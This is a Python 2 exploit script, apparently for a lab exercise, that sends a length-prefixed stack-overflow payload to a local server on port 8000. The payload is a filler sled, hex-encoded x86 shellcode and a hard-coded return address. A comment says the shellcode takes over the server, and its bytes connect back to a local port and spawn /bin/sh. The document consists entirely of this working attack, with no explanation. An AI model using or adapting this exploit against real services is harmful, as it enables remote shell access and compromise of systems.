#!/usr/bin/python

import os, socket, struct, sys
HOST = '127.0.0.1'
PORT = 8000
def run():
	#code that take over the server 
	#the shellcode.asm in hex
	code='\xba\x00\x00\x00\x00\x81\xec\x00\x04\x00\x00\x89\xe5\x81\xed\x00\x04\x00\x00f\xc7E\xe4\x02\x00\xc7\x04$9\x05\x00\x00\xbe \x86\x04\x08\xff\xd6f\x89E\xe6\xc7E\xe8\x7f\x00\x00\x01\xc7D$\x08\x00\x00\x00\x00\xc7D$\x04\x01\x00\x00\x00\xc7\x04$\x02\x00\x00\x00\xbe\x10\x87\x04\x08\xff\xd6\x89E\xe0\xc7D$\x08\x10\x00\x00\x00\x8dE\xe4\x89D$\x04\x8bE\xe0\x89\x04$\xbe0\x87\x04\x08\xff\xd6\xc7D$\x04\x00\x00\x00\x00\x8bE\xe0\x89\x04$\xbe\xe0\x85\x04\x08\xff\xd6\xc7D$\x04\x01\x00\x00\x00\x8bE\xe0\x89\x04$\xbe\xe0\x85\x04\x08\xff\xd6\xc7D$\x04\x02\x00\x00\x00\x8bE\xe0\x89\x04$\xbe\xe0\x85\x04\x08\xff\xd6\xc7D$\x04\x00\x00\x00\x00\xeb\x10[1\xc9\x88K\x07\x89\x1c$\xbe\xb0\x86\x04\x08\xff\xd6\xe8\xeb\xff\xff\xff/bin/sh\x00'
	crashMsg=''
	for i in range(0,1040-len(code)):
		#"nop" slide below x80(x42==INC edx)		
		crashMsg+='\x42'
	crashMsg+=code
	crashMsg+='\xff\xf1\xff\xbf'
	conn = socket.socket()
	conn.connect((HOST, PORT))
	try:
		conn.send(struct.pack('<I',len(crashMsg))+crashMsg)
	finally:
		conn.close()
if __name__ == '__main__':
    run()
